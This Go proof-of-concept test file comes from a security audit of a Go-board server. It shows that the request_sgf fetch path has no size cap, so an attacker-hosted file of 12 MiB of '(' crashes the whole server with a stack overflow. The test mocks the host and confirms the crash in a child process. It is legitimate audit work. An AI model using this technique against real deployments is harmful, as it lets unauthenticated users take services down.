//go:build poc

// PoC for N-IN (integrations audit): the request_sgf fetch path has NO size cap.
//
// handleUploadSGF caps the websocket-upload string branch at 1 MiB, but
// handleRequestSGF -> fetch.ApprovedFetch -> Fetch does io.ReadAll with NO limit
// and hands the body straight to Room.UploadSGF -> state.FromSGF. Several
// allow-listed hosts serve ATTACKER-CONTROLLED content (raw.githubusercontent.com
// — any public repo; cdn.discordapp.com — any uploaded attachment), so an
// unauthenticated client can make the server download an arbitrarily large SGF:
//   - ~12 MB of '(' => parseBranch stack overflow (fatal, whole-server crash)
//   - a multi-GB body => OOM (fatal)
// The attacker's own request is a tiny JSON, so reverse-proxy body caps are
// irrelevant; the size is on the server-side DOWNLOAD.
//
// Run: go test -tags poc -run TestNINRequestSGF -v ./pkg/room/
package room

import (
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"testing"
	"time"

	"github.com/golab/board/internal/fetch"
	"github.com/golab/board/pkg/event"
	"github.com/golab/board/pkg/logx"
)

// hugeClient simulates an allow-listed host (e.g. raw.githubusercontent.com)
// serving an attacker-controlled 12 MiB file of '(' — enough to overflow the
// SGF parser's recursive parseBranch (see SECURITY_ASSESSMENT.md C-3, which
// was only shown via the WS array branch; request_sgf has NO cap at all).
type hugeClient struct{ n int }

func (c *hugeClient) Get(url string) (*http.Response, error) {
	body := io.NopCloser(strings.NewReader(strings.Repeat("(", c.n)))
	return &http.Response{StatusCode: 200, Body: body}, nil
}

func TestNINRequestSGFNoCap(t *testing.T) {
	if os.Getenv("NIN_CHILD") == "1" {
		// child: run the REAL handler chain with the huge "approved" response.
		r := NewRoom("nin-fetch")
		r.SetLogger(logx.NewDefaultLogger(logx.LogLevelError))
		r.SetFetcher(fetch.NewDefaultFetcher(&hugeClient{n: 12_000_000}))
		// age the room so outsideBuffer admits the first event (as any real room
		// would be for an attacker who waits a beat after creation)
		past := time.Now().Add(-time.Second)
		r.SetLastActive(&past)
		e := event.NewEvent("request_sgf", "http://raw.githubusercontent.com/attacker/repo/bomb.sgf")
		e.SetUser("unauth-attacker")
		// prove the fetch itself is uncapped (prints before the crash)
		data, err := fetch.NewDefaultFetcher(&hugeClient{n: 12_000_000}).ApprovedFetch(
			"http://raw.githubusercontent.com/attacker/repo/bomb.sgf")
		if err != nil {
			t.Fatalf("fetch failed: %v", err)
		}
		t.Logf("ApprovedFetch returned %d bytes with NO size cap (hostname allow-list passed)", len(data))
		os.Stdout.Sync()
		r.HandleAny(e) // -> handleRequestSGF -> UploadSGF -> FromSGF -> stack overflow (FATAL)
		t.Logf("no crash (unexpected)")
		return
	}

	// parent: run the child and verify it died with a stack overflow.
	cmd := exec.Command(os.Args[0], "-test.run", "TestNINRequestSGFNoCap", "-test.v")
	cmd.Env = append(os.Environ(), "NIN_CHILD=1")
	out, err := cmd.CombinedOutput()
	s := string(out)
	t.Logf("child output (tail):\n%s", tail(s, 2000))
	if strings.Contains(s, "NO size cap") && strings.Contains(s, "stack overflow") {
		t.Logf("N-IN request_sgf CONFIRMED: the server downloaded the full 12 MiB attacker file and")
		t.Logf("    died with a FATAL stack overflow inside handleRequestSGF (whole-server crash, unauthenticated).")
		return
	}
	if err == nil {
		t.Fatalf("child did not crash (unexpected)")
	}
	t.Fatalf("unexpected child outcome: err=%v", err)
}

func tail(s string, n int) string {
	if len(s) > n {
		return s[len(s)-n:]
	}
	return s
}
